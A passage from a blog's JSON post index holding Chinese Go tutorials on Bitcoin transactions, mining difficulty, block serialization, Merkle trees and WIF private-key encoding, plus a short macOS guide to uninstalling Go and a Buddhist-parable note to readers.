fa-2x\"&gt;","categories":[{"name":"前端","slug":"前端","permalink":"https://dreamerjonson.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"https://dreamerjonson.com/tags/前端/"},{"name":"css","slug":"css","permalink":"https://dreamerjonson.com/tags/css/"}]},{"title":"【置顶】— 写给读者悄悄话","slug":"Whisper","date":"2018-12-14T02:49:44.000Z","updated":"2019-02-04T08:36:36.711Z","comments":true,"path":"2018/12/14/Whisper/","link":"","permalink":"https://dreamerjonson.com/2018/12/14/Whisper/","excerpt":"","text":"盲人摸象 “有王告大臣，汝牵一象来示盲者时，众盲各以手触。大王唤众盲问之：“汝见象类何物？ 触其牙者言：象形如萝菔根； 触其耳者言如萁；触其脚者言如臼； 触其脊者言如床；触其腹者言如瓮； 触其尾者言如绳。 ……王喻如来正偏知，臣喻方等涅槃经，又象喻佛性，盲者喻一切众生无明也。” 《涅槃经》（卷三十二） 盲人摸象的故事来自于佛经，既然是人就免不了局限，常常是只能观察到表面与局部却难以洞察全局。常常因此酿成大祸。不可不察啊。 指月 无尽藏尼对六祖惠能说：“我研读《涅槃经》多年，劫仍有许多不解之处，希望能得到指教。” 惠能对她说：“我不识字，请你把经读给我听，这样我或许可以帮你解决一些问题。” 无尽藏尼笑道：“你连字都不识，怎谈得上解释经典呢？” 惠能对她说：“真理是与文字无关的，真理好象天上的明月，而文字只是指月的手指， 手指可以指出明月的所在，但手指并不就是明月，看月也不一定必须透过手指，不是这样吗？ 《六祖坛经》 有了一身好皮囊，却有太多的虚伪。但是我想要的大道理，不管是谁，以如何的形式，我都虚心接受。","categories":[{"name":"置顶","slug":"置顶","permalink":"https://dreamerjonson.com/categories/置顶/"}],"tags":[{"name":"置顶","slug":"置顶","permalink":"https://dreamerjonson.com/tags/置顶/"}]},{"title":"go语言渐入佳境[47]-区块链-比特币交易","slug":"golang-47-blockchain-transation","date":"2018-12-13T08:29:58.000Z","updated":"2019-02-04T08:33:38.202Z","comments":true,"path":"2018/12/13/golang-47-blockchain-transation/","link":"","permalink":"https://dreamerjonson.com/2018/12/13/golang-47-blockchain-transation/","excerpt":"","text":"比特币的交易 第一笔交易比较特殊，他是coinbase交易，矿工的收益。 金额每4年减少一半，从2009年一开始一个区块奖励50BTC、后来减少为了25个BTC、一直到18年 12.5BTC。总共有2100万BTC。 交易和我们的银行的转账非常不同，比特币中没有记录账户的信息、而是交易的信息。 go实现交易 demo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105package mainimport ( \"bytes\" \"encoding/gob\" \"log\" \"crypto/sha256\" \"fmt\" \"strings\")const subsidy = 100type Transation struct&#123; ID []byte Vin []TXInput Vout []TXOutput&#125; type TXInput struct &#123; TXid []byte Voutindex int Signature []byte &#125;type TXOutput struct &#123; value int PubkeyHash []byte&#125;//格式化打印交易完整信息func (tx Transation) String() string &#123; var lines []string lines = append(lines, fmt.Sprintf(\"--- Transaction %x:\", tx.ID)) for i, input := range tx.Vin &#123; lines = append(lines, fmt.Sprintf(\" Input %d:\", i)) lines = append(lines, fmt.Sprintf(\" TXID: %x\", input.TXid)) lines = append(lines, fmt.Sprintf(\" Out: %d\", input.Voutindex)) lines = append(lines, fmt.Sprintf(\" Signature: %x\", input.Signature)) &#125; for i, output := range tx.Vout &#123; lines = append(lines, fmt.Sprintf(\" Output %d:\", i)) lines = append(lines, fmt.Sprintf(\" Value: %d\", output.value)) lines = append(lines, fmt.Sprintf(\" Script: %x\", output.PubkeyHash)) &#125; return strings.Join(lines, \"\\n\")&#125;//序列化func (tx Transation) Serialize() []byte&#123; var encoded bytes.Buffer enc:= gob.NewEncoder(&amp;encoded) err:= enc.Encode(tx) if err!=nil&#123; log.Panic(err) &#125; return encoded.Bytes()&#125;//计算交易的hash值func (tx *Transation) Hash() []byte&#123; txcopy := *tx txcopy.ID = []byte&#123;&#125; hash:= sha256.Sum256(txcopy.Serialize()) return hash[:]&#125;//根据金额与地址新建一个输出func NewTXOutput(value int,address string) * TXOutput&#123; txo := &amp;TXOutput&#123;value,nil&#125; txo.PubkeyHash = []byte(address) return txo&#125;//第一笔coinbase交易func NewCoinbaseTX(to string) *Transation&#123; txin := TXInput&#123;[]byte&#123;&#125;,-1,nil&#125; txout := NewTXOutput(subsidy,to) tx:= Transation&#123;nil,[]TXInput&#123;txin&#125;,[]TXOutput&#123;*txout&#125;&#125; tx.ID = tx.Hash() return &amp;tx&#125;func main()&#123; newTX := NewCoinbaseTX(\"jonson\") fmt.Printf(\"%s\",newTX.String())&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"完全卸载go语言编译器","slug":"uninstall-go-mac","date":"2018-12-13T03:56:55.000Z","updated":"2018-12-14T03:41:55.639Z","comments":true,"path":"2018/12/13/uninstall-go-mac/","link":"","permalink":"https://dreamerjonson.com/2018/12/13/uninstall-go-mac/","excerpt":"","text":"在mac中完全卸载golang编译器 如果你是通过安装包的形式 安装的go语言编译器，那么更新的方式也会非常简单，那就是直接下载新的golang安装包。 在安装新的时候，会自动删除掉旧的编译器。 手动删除 查看路径在哪里： 1&gt; which go root 权限下 删除 1&gt; rm -rf /usr/local/go 删除 1&gt; rm -rf /etc/paths.d/go 将环境变量，有关 go 的删了即可 1&gt; vim ~/.bash_profile","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[46]-区块链-比特币真实挖矿过程实现","slug":"golang-46-blockchain-pow","date":"2018-12-12T15:19:59.000Z","updated":"2019-02-04T08:33:32.925Z","comments":true,"path":"2018/12/12/golang-46-blockchain-pow/","link":"","permalink":"https://dreamerjonson.com/2018/12/12/golang-46-blockchain-pow/","excerpt":"","text":"比特币真实挖矿过程实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178package mainimport ( \"bytes\" \"encoding/binary\" \"log\" \"fmt\" \"encoding/hex\" \"crypto/sha256\" \"strconv\" \"math\" \"math/big\")var ( maxnonce int32 = math.MaxInt32)type Block struct&#123; version int32 prevBlockHash []byte merkleroot [] byte hash []byte time int32 bits int32 nonce int32&#125;//将类型转化为了字节数组func IntToHex(num int32) []byte&#123; buff := new(bytes.Buffer)//binary.LittleEndian 小端模式 err:= binary.Write(buff,binary.LittleEndian,num) if err!=nil&#123; log.Panic(err) &#125; return buff.Bytes()&#125;//将类型转化为了字节数组func IntToHex2(num int32) []byte&#123; buff := new(bytes.Buffer) //binary.LittleEndian 小端模式 err:= binary.Write(buff,binary.BigEndian,num) if err!=nil&#123; log.Panic(err) &#125; return buff.Bytes()&#125;//字节反转func ReverseBytes4(data []byte)&#123; for i,j :=0,len(data) - 1;i&lt;j;i,j = i+1,j - 1&#123; data[i],data[j] = data[j],data[i] &#125;&#125;//序列化func (block *Block) serialize() []byte&#123; result := bytes.Join( [][]byte&#123; IntToHex(block.version), block.prevBlockHash, block.merkleroot, IntToHex(block.time), IntToHex(block.bits), IntToHex(block.nonce)&#125;, []byte&#123;&#125;, ) return result&#125;func main()&#123; //前一个区块的hash prev,_ := hex.DecodeString(\"000000000000000016145aa12fa7e81a304c38aec3d7c5208f1d33b587f966a6\") ReverseBytes4(prev) fmt.Printf(\"%x\\n\",prev) //默克尔根 merkleroot,_ := hex.DecodeString(\"3a4f410269fcc4c7885770bc8841ce6781f15dd304ae5d2770fc93a21dbd70d7\") ReverseBytes4(merkleroot) fmt.Printf(\"%x\\n\",merkleroot) //初始化区块 block := &amp;Block&#123; 2, prev, merkleroot, []byte&#123;&#125;, 1418755780, 404454260, 0, &#125; //目标hash //fmt.Printf(\"targethash:%x\",CalculateTargetFast(IntToHex2(block.bits))) targetHash:=CalculateTargetFast(IntToHex2(block.bits)) //目标hash转换为bit.int var tartget big.Int tartget.SetBytes(targetHash) //当前hash var currenthash big.Int //一直计算到最大值， block.nonce的值不断变化 for block.nonce &lt; maxnonce&#123; //序列化，block.nonce的值不断变化带来序列化的变化 data:= block.serialize() //double hash fitstHash := sha256.Sum256(data) secondhash := sha256.Sum256(fitstHash[:]) //反转 ReverseBytes4(secondhash[:]) fmt.Printf(\"nonce:%d, currenthash:%x\\n\",block.nonce,secondhash) currenthash.SetBytes(secondhash[:]) //比较 if currenthash.Cmp(&amp;tartget) == -1&#123; break &#125;else&#123; block.nonce++ &#125; &#125;&#125;//18 1B7B74//计算困难度func CalculateTargetFast(bits []byte) []byte&#123; var result []byte //第一个字节 计算指数 exponent := bits[:1] fmt.Printf(\"%x\\n\",exponent) //计算后面3个系数 coeffient:= bits[1:] fmt.Printf(\"%x\\n\",coeffient) //将字节，他的16进制为\"18\" 转化为了string \"18\" str:= hex.EncodeToString(exponent) //\"18\" fmt.Printf(\"str=%s\\n\",str) //将字符串18转化为了10进制int64 24 exp,_:=strconv.ParseInt(str,16,8) fmt.Printf(\"exp=%d\\n\",exp) //拼接，计算出目标hash result = append(bytes.Repeat([]byte&#123;0x00&#125;,32-int(exp)),coeffient...) result = append(result,bytes.Repeat([]byte&#123;0x00&#125;,32-len(result))...) return result&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[45]-区块链-挖矿困难度","slug":"golang-45-blockchain-difficulty","date":"2018-12-12T14:19:50.000Z","updated":"2019-02-04T08:33:26.869Z","comments":true,"path":"2018/12/12/golang-45-blockchain-difficulty/","link":"","permalink":"https://dreamerjonson.com/2018/12/12/golang-45-blockchain-difficulty/","excerpt":"","text":"##比特币挖矿困难度 比特币的挖矿困难度 = 目标hash / 创世hash 比特币挖矿的计算 12345678910111213141516/**计算挖矿difficulty */func CalculateDifficulty(strTargetHash string) string &#123; strGeniusBlockHash := \"00000000ffff0000000000000000000000000000000000000000000000000000\" // 创世块编号 var biGeniusHash big.Int var biTargetHash big.Int biGeniusHash.SetString(strGeniusBlockHash, 16) biTargetHash.SetString(strTargetHash, 16) difficulty := big.NewInt(0) difficulty.Div(&amp;biGeniusHash, &amp;biTargetHash) //fmt.Printf(\"%T \\n\" , difficulty) return fmt.Sprintf(\"%s\", difficulty)&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[44]-区块链-目标值","slug":"golang-44-blockchain-targetHash","date":"2018-12-12T10:14:47.000Z","updated":"2019-02-04T08:33:22.155Z","comments":true,"path":"2018/12/12/golang-44-blockchain-targetHash/","link":"","permalink":"https://dreamerjonson.com/2018/12/12/golang-44-blockchain-targetHash/","excerpt":"","text":"比特币目标hash计算过程 以之前的bits：181B7B74为例子 1234567891011121314151617181920212223242526272829303132333435func main()&#123; bits,_:= hex.DecodeString(\"181B7B74\") fmt.Printf(\"%x\",CalculateTargetFast(bits))&#125;//18 1B7B74func CalculateTargetFast(bits []byte) []byte&#123; var result []byte //第一个字节 计算指数 exponent := bits[:1] fmt.Printf(\"%x\\n\",exponent) //计算后面3个字节 系数 coeffient:= bits[1:] fmt.Printf(\"%x\\n\",coeffient) //将字节，他的16进制为\"18\" 转化为了string \"18\" str:= hex.EncodeToString(exponent) //\"18\" fmt.Printf(\"str=%s\\n\",str) //将字符串18转化为了10进制int64 24 exp,_:=strconv.ParseInt(str,16,8) fmt.Printf(\"exp=%d\\n\",exp) //拼接，计算出目标hash result = append(bytes.Repeat([]byte&#123;0x00&#125;,32-int(exp)),coeffient...) result = append(result,bytes.Repeat([]byte&#123;0x00&#125;,32-len(result))...) return result&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[43]-区块链-真实比特币序列化","slug":"golang-43-blockchain-serialize","date":"2018-12-12T05:18:08.000Z","updated":"2019-02-04T08:33:16.651Z","comments":true,"path":"2018/12/12/golang-43-blockchain-serialize/","link":"","permalink":"https://dreamerjonson.com/2018/12/12/golang-43-blockchain-serialize/","excerpt":"","text":"真实比特币序列化 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374package mainimport ( \"bytes\" \"encoding/binary\" \"log\" \"fmt\" \"encoding/hex\" \"crypto/sha256\")//将类型转化为了字节数组func IntToHex(num int32) []byte&#123; buff := new(bytes.Buffer)//binary.LittleEndian 小端模式 err:= binary.Write(buff,binary.LittleEndian,num) if err!=nil&#123; log.Panic(err) &#125; return buff.Bytes()&#125;//字节反转func ReverseBytes4(data []byte)&#123; for i,j :=0,len(data) - 1;i&lt;j;i,j = i+1,j - 1&#123; data[i],data[j] = data[j],data[i] &#125;&#125;func main()&#123; //版本号 var version int32 = 2 fmt.Printf(\"%x\\n\",IntToHex(version)) //前一个区块的hash prev,_ := hex.DecodeString(\"000000000000000016145aa12fa7e81a304c38aec3d7c5208f1d33b587f966a6\") ReverseBytes4(prev) fmt.Printf(\"%x\\n\",prev)//默克尔根 merkleroot,_ := hex.DecodeString(\"3a4f410269fcc4c7885770bc8841ce6781f15dd304ae5d2770fc93a21dbd70d7\") ReverseBytes4(merkleroot) fmt.Printf(\"%x\\n\",merkleroot)//时间 var time int32 = 1418755780 fmt.Printf(\"%x\\n\",IntToHex(time))//难度 var bits int32 = 404454260 fmt.Printf(\"%x\\n\",IntToHex(bits))//随机数 var nonce int32 = 1865996595 fmt.Printf(\"%x\\n\",IntToHex(nonce))//拼接 result := bytes.Join([][]byte&#123;IntToHex(version),prev,merkleroot,IntToHex(time),IntToHex(bits),IntToHex(nonce)&#125;,[]byte&#123;&#125;) fmt.Printf(\"%x\\n\",result) //double hash256 firsthash := sha256.Sum256(result) resulthash:= sha256.Sum256(firsthash[:]) ReverseBytes4(resulthash[:]) fmt.Printf(\"%x\",resulthash)&#125; 参考资料： https://www.blockchain.com/btc/block/00000000000000000a1f57cd656e5522b7bac263aa33fc98c583ad68de309603","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[42]-区块链-go实战比特币默克尔树","slug":"golang-42-blockchain-merkletree2","date":"2018-12-11T01:34:44.000Z","updated":"2019-02-04T08:33:11.252Z","comments":true,"path":"2018/12/11/golang-42-blockchain-merkletree2/","link":"","permalink":"https://dreamerjonson.com/2018/12/11/golang-42-blockchain-merkletree2/","excerpt":"","text":"go实战比特币默克尔树 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114package mainimport ( &quot;crypto/sha256&quot; &quot;encoding/hex&quot; &quot;fmt&quot;)func min(a int,b int) int&#123; if(a&gt;b)&#123; return b &#125; return a&#125;//默克尔树节点type MerkleTree struct&#123; RootNode *MerkleNode&#125;//默克尔根节点type MerkleNode struct&#123; Left *MerkleNode Right *MerkleNode Data []byte&#125;//生成默克尔树中的节点，如果是叶子节点，则Left，right为nil ，如果为非叶子节点，根据Left，right生成当前节点的hashfunc NewMerkleNode(left,right *MerkleNode,data []byte) *MerkleNode&#123; mnode := MerkleNode&#123;&#125; if left ==nil &amp;&amp; right==nil&#123; mnode.Data = data &#125;else&#123; prevhashes := append(left.Data,right.Data...) firsthash:= sha256.Sum256(prevhashes) hash:=sha256.Sum256(firsthash[:]) mnode.Data = hash[:] &#125; mnode.Left = left mnode.Right = right return &amp;mnode&#125;//构建默克尔树func NewMerkleTree(data [][]byte) *MerkleTree&#123; var nodes []MerkleNode //构建叶子节点。 for _,datum := range data&#123; node:= NewMerkleNode(nil,nil,datum) nodes = append(nodes,*node) &#125; //j代表的是某一层的第一个元素 j:=0 //第一层循环代表 nSize代表某一层的个数，每循环一次减半 for nSize :=len(data);nSize &gt;1;nSize = (nSize+1)/2&#123; //第二条循环i+=2代表两两拼接。 i2是为了当个数是基数的时候，拷贝最后的元素。 for i:=0 ; i&lt;nSize ;i+=2&#123; i2 := min(i+1,nSize-1) node := NewMerkleNode(&amp;nodes[j+i],&amp;nodes[j+i2],nil) nodes = append(nodes,*node) &#125; //j代表的是某一层的第一个元素 j+=nSize &#125; mTree := MerkleTree&#123;&amp;(nodes[len(nodes)-1])&#125; return &amp;mTree&#125;func ReverseBytes3(data []byte)&#123; for i,j :=0,len(data) - 1;i&lt;j;i,j = i+1,j - 1&#123; data[i],data[j] = data[j],data[i] &#125;&#125;func main()&#123; //测试网站下的5个hash是否能够生成merkleRoot //https://www.blockchain.com/btc/block/00000000000090ff2791fe41d80509af6ffbd6c5b10294e29cdf1b603acab92c //传递hash data1,_:=hex.DecodeString(&quot;6b6a4236fb06fead0f1bd7fc4f4de123796eb51675fb55dc18c33fe12e33169d&quot;) data2,_:=hex.DecodeString(&quot;2af6b6f6bc6e613049637e32b1809dd767c72f912fef2b978992c6408483d77e&quot;) data3,_:=hex.DecodeString(&quot;6d76d15213c11fcbf4cc7e880f34c35dae43f8081ef30c6901f513ce41374583&quot;) data4,_:=hex.DecodeString(&quot;08c3b50053b010542dca85594af182f8fcf2f0d2bfe8a806e9494e4792222ad2&quot;) data5,_:=hex.DecodeString(&quot;612d035670b7b9dad50f987dfa000a5324ecb3e08745cfefa10a4cefc5544553&quot;) //大小段转换 ReverseBytes3(data1) ReverseBytes3(data2) ReverseBytes3(data3) ReverseBytes3(data4) ReverseBytes3(data5) hehe := [][]byte&#123; data1, data2, data3, data4, data5, &#125; //生成默克尔树 merleroot:= NewMerkleTree(hehe) //反转 ReverseBytes3(merleroot.RootNode.Data) fmt.Printf(&quot;%x&quot;,merleroot.RootNode.Data)&#125; 参考资料 eth wiki:patricia-tree [csdn 默克尔树解释]https://blog.csdn.net/wo541075754/article/details/54632929 https://github.com/ZtesoftCS/go-ethereum-code-analysis/blob/master/trie源码分析.md","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[41]-区块链-默克尔树构建","slug":"golang-41-blockchain-merkletree","date":"2018-12-10T11:04:33.000Z","updated":"2019-02-04T08:33:06.170Z","comments":true,"path":"2018/12/10/golang-41-blockchain-merkletree/","link":"","permalink":"https://dreamerjonson.com/2018/12/10/golang-41-blockchain-merkletree/","excerpt":"","text":"大自然的启示 Banyan树的启示：印度banyan树，最大的一颗可以长到1万平方米以上。其如此巨大的秘密就在于其枝干也会产生根，起到支撑，从而作为附属树干，继续生成分支。大自然给人太多启示…… Merkle Tree Merkle Tree，通常也被称作Hash Tree，顾名思义，就是存储hash值的一棵树。Merkle树是一种数据结构，Merkle树的叶子是数据块(例如，文件或者文件的集合)的hash值。非叶节点是其对应子节点串联字符串的hash。 Merkle树是使区块链发挥作用的基本组成部分。虽然理论上可以在没有Merkle树的情况下制作区块链，但只需创建直接包含每个事务的巨型块头，这样做会带来巨大的可扩展性挑战，可以说无可置疑地使用区块链的能力超出了所有范围，从长远来看，功能强大的电脑。感谢Merkle树，可以构建在所有计算机和大小笔记本电脑上运行的以太网节点，智能手机，甚至是物联网设备 比特币中默克尔树的构建过程： 对于网站中的交易： https://www.blockchain.com/btc/block/000000000001741120135274584b2a0da45b39c8cc78322a14f9004ae766a8e0 1234567891011121314151617181920212223第一笔hash：16f0eb42cb4d9c2374b2cb1de4008162c06fdd8f1c18357f0c849eb423672f5f大小端转换为：5f2f6723b49e840c7f35181c8fdd6fc0628100e41dcbb274239c4dcb42ebf016第二笔hash：cce2f95fc282b3f2bc956f61d6924f73d658a1fdbc71027dd40b06c15822e061大小端转换为：61e02258c1060bd47d0271bcfda158d6734f92d6616f95bcf2b382c25ff9e2cc将两个拼接在一起：5f2f6723b49e840c7f35181c8fdd6fc0628100e41dcbb274239c4dcb42ebf01661e02258c1060bd47d0271bcfda158d6734f92d6616f95bcf2b382c25ff9e2cc将上面拼接的字符串进行两次hash如下：第一次hash结果：9b2ec096d49fee8b310752082d63d8fe198386ae2172d90533d9186bb28df63d将上面计算出的hash值再次进行hash：525894ddd0891b36c5ff8658e2a978d615b35ce6dedb5cb83f2420dbcd40a0c7大小端转换即为结果：c7a040cddb20243fb85cdbdee65cb315d678a9e25886ffc5361b89d0dd945852 go语言实现上面的验证过程 1234567891011121314151617181920212223242526272829303132333435363738394041424344package mainimport ( \"encoding/hex\" \"crypto/sha256\" \"fmt\")func ReverseBytes2(data []byte)&#123; for i,j :=0,len(data) - 1;i&lt;j;i,j = i+1,j - 1&#123; data[i],data[j] = data[j],data[i] &#125;&#125;func main()&#123; //字符串hash转换为字节 hash1,_:= hex.DecodeString(\"16f0eb42cb4d9c2374b2cb1de4008162c06fdd8f1c18357f0c849eb423672f5f\") hash2,_:= hex.DecodeString(\"cce2f95fc282b3f2bc956f61d6924f73d658a1fdbc71027dd40b06c15822e061\") //大小端的转换 ReverseBytes2(hash1) ReverseBytes2(hash2) //拼接在一起 rawdata:=append(hash1,hash2...) //double hash256 firsthash:=sha256.Sum256(rawdata) secondhash:= sha256.Sum256(firsthash[:]) merkroot := secondhash[:] //反转，与浏览器当中的数据对比 ReverseBytes2(merkroot) fmt.Printf(\"%x\",merkroot)&#125; 参考资料 eth wiki:patricia-tree [csdn 默克尔树解释]https://blog.csdn.net/wo541075754/article/details/54632929 https://github.com/ZtesoftCS/go-ethereum-code-analysis/blob/master/trie源码分析.md","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[40]-区块链-wif倒推出私钥","slug":"golang-40-blockchain-verifyprivatekeywif","date":"2018-12-09T14:40:53.000Z","updated":"2019-02-04T08:33:00.451Z","comments":true,"path":"2018/12/09/golang-40-blockchain-verifyprivatekeywif/","link":"","permalink":"https://dreamerjonson.com/2018/12/09/golang-40-blockchain-verifyprivatekeywif/","excerpt":"","text":"wif倒推出私钥 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174package mainimport ( \"encoding/hex\" \"crypto/sha256\" \"math/big\" \"bytes\" \"fmt\")//base58编码var b58Alphabet = []byte(\"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\")func Base58Encode(input []byte) []byte&#123; var result []byte x:= big.NewInt(0).SetBytes(input) base := big.NewInt(int64(len(b58Alphabet))) zero := big.NewInt(0) mod := &amp;big.Int&#123;&#125; for x.Cmp(zero) != 0 &#123; x.DivMod(x,base,mod) // 对x取余数 result = append(result, b58Alphabet[mod.Int64()]) &#125; ReverseBytes(result) for _,b:=range input&#123; if b ==0x00&#123; result = append([]byte&#123;b58Alphabet[0]&#125;,result...) &#125;else&#123; break &#125; &#125; return result&#125;//字节数组的反转func ReverseBytes(data []byte)&#123; for i,j :=0,len(data) - 1;i&lt;j;i,j = i+1,j - 1&#123; data[i],data[j] = data[j],data[i] &#125;&#125;func generatePrivateKey(hexprivatekey string,compressed bool) []byte&#123; versionstr :=\"\"//判断是否对应的是压缩的公钥，如果是，需要在后面加上0x01这个字节。同时任何的私钥，我们需要在前方0x80的字节 if compressed&#123; versionstr = \"80\" + hexprivatekey + \"01\" &#125;else&#123; versionstr = \"80\" + hexprivatekey &#125; //字符串转化为16进制的字节 privatekey,_:=hex.DecodeString(versionstr)//通过 double hash 计算checksum.checksum他是两次hash256以后的前4个字节。 firsthash:=sha256.Sum256(privatekey) secondhash:= sha256.Sum256(firsthash[:]) checksum := secondhash[:4] //拼接 result := append(privatekey,checksum...) //最后进行base58的编码 base58result :=Base58Encode(result) return base58result&#125;func Base58Decode(input []byte) []byte&#123; result := big.NewInt(0) zeroBytes :=0 for _,b :=range input&#123; if b=='1'&#123; zeroBytes++ &#125;else&#123; break &#125; &#125; payload:= input[zeroBytes:] for _,b := range payload&#123; charIndex := bytes.IndexByte(b58Alphabet,b) //反推出余数 result.Mul(result,big.NewInt(58)) //之前的结果乘以58 result.Add(result,big.NewInt(int64(charIndex))) //加上这个余数 &#125; decoded :=result.Bytes() decoded = append(bytes.Repeat([]byte&#123;0x00&#125;,zeroBytes),decoded...) return decoded&#125;//检查checkWIF是否有效func checkWIF(wifprivate string) bool&#123; rawdata := []byte(wifprivate) //包含了80、私钥、checksum base58decodedata:= Base58Decode(rawdata) fmt.Printf(\"base58decodedata：%x\\n\",base58decodedata) length :=len(base58decodedata) if(length &lt;37)&#123; fmt.Printf(\"长度小于37，一定有问题\") return false &#125; private := base58decodedata[:(length-4)] //得到检查码 //fmt.Printf(\"private：%x\\n\",private) firstsha := sha256.Sum256(private) secondsha := sha256.Sum256(firstsha[:]) checksum := secondsha[:4] //fmt.Printf(\"%x\\n\",checksum) //得到原始的检查码 orignchecksum:= base58decodedata[(length-4):]// fmt.Printf(\"%x\\n\",orignchecksum) //[]byte对比 if bytes.Compare(checksum,orignchecksum)==0&#123; return true &#125; return false&#125;//通过wif格式的私钥，得到原始的私钥。func getPrivateKeyfromWIF( wifprivate string) []byte&#123; if checkWIF(wifprivate)&#123; rawdata := []byte(wifprivate) //包含了80、私钥、checksum base58decodedata:= Base58Decode(rawdata) //私钥一共32个字节，排除了0x80 return base58decodedata[1:33] &#125; return []byte&#123;&#125;&#125;func main()&#123; //得到wif格式的私钥 wifprivatekey:=generatePrivateKey(\"18d3e15d48b2df76562fab783eac137aaeb611e6ff0a193e12ceef1354220ac7\",false) fmt.Printf(\"%s\\n\",wifprivatekey) //【】byte转换为string str := fmt.Sprintf(\"%s\",wifprivatekey) //得到原始的私钥 privatekey :=getPrivateKeyfromWIF(str) fmt.Printf(\"%x\", privatekey)&#125; 参考资料 https://en.bitcoin.it/wiki/Private_key https://en.bitcoin.it/wiki/Wallet_import_format http://gobittest.appspot.com/PrivateKey","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[39]-区块链-产生wif私钥","slug":"golang-39-blockchain-generateprivatekeywif","date":"2018-12-09T10:51:37.000Z","updated":"2019-02-04T08:32:55.523Z","comments":true,"path":"2018/12/09/golang-39-blockchain-generateprivatekeywif/","link":"","permalink":"https://dreamerjonson.com/2018/12/09/golang-39-blockchain-generateprivatekeywif/","excerpt":"","text":"压缩公钥 公钥一般来说是椭圆曲线上的x,y坐标拼接在一起的。压缩的公钥其实就是x的坐标。 WIF 私钥产生 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182package mainimport ( \"encoding/hex\" \"crypto/sha256\" \"math/big\" \"fmt\")//base58编码var b58Alphabet = []byte(\"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\")func Base58Encode(input []byte) []byte&#123; var result []byte x:= big.NewInt(0).SetBytes(input) base := big.NewInt(int64(len(b58Alphabet))) zero := big.NewInt(0) mod := &amp;big.Int&#123;&#125; for x.Cmp(zero) != 0 &#123; x.DivMod(x,base,mod) // 对x取余数 result = append(result, b58Alphabet[mod.Int64()]) &#125; ReverseBytes(result) for _,b:=range input&#123; if b ==0x00&#123; result = append([]byte&#123;b58Alphabet[0]&#125;,result...) &#125;else&#123; break &#125; &#125; return result&#125;//字节数组的反转func ReverseBytes(data []byte)&#123; for i,j :=0,len(data) - 1;i&lt;j;i,j = i+1,j - 1&#123; data[i],data[j] = data[j],data[i] &#125;&#125;func generatePrivateKey(hexprivatekey string,compressed bool) []byte&#123; versionstr :=\"\"//判断是否对应的是压缩的公钥，如果是，需要在后面加上0x01这个字节。同时任何的私钥，我们需要在前方0x80的字节 if compressed&#123; versionstr = \"80\" + hexprivatekey + \"01\" &#125;else&#123; versionstr = \"80\" + hexprivatekey &#125; //字符串转化为16进制的字节 privatekey,_:=hex.DecodeString(versionstr)//通过 double hash 计算checksum.checksum他是两次hash256以后的前4个字节。 firsthash:=sha256.Sum256(privatekey) secondhash:= sha256.Sum256(firsthash[:]) checksum := secondhash[:4] //拼接 result := append(privatekey,checksum...) //最后进行base58的编码 base58result :=Base58Encode(result) return base58result&#125;func main()&#123; wifprivatekey:=generatePrivateKey(\"18d3e15d48b2df76562fab783eac137aaeb611e6ff0a193e12ceef1354220ac7\",true) fmt.Printf(\"%s\",wifprivatekey)&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[38]-区块链- 生成比特币地址","slug":"golang-38-blockchain-generateAddress","date":"2018-12-07T08:31:18.000Z","updated":"2019-02-04T08:32:51.042Z","comments":true,"path":"2018/12/07/golang-38-blockchain-generateAddress/","link":"","permalink":"https://dreamerjonson.com/2018/12/07/golang-38-blockchain-generateAddress/","excerpt":"","text":"生成比特币地址 